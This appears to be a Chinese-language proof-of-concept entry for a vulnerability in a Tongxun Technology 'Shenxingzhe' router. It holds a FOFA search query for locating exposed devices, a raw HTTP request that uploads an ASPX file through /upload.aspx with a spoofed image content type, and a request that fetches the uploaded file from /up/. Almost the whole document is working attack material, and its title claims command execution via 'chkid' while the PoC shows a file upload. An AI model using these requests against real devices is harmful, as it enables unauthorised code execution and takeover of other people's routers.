# 同迅科技-神行者路由chkid存在命令执行


## fofa

```javascript
web.body="icon pwd"&&web.body="\"login-logo\">LOGO"
```

## poc

```javascript
POST /upload.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Connection: close

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="test.aspx"
Content-Type: image/png

12345
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```
<img width="705" height="237" alt="image" src="https://github.com/user-attachments/assets/5c0a784f-5a0a-476f-8418-1dc8809bd5f0" />

## 文件访问位置

```javascript
GET /up/611d3aa6339e484b876b85616de42bd8.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
```
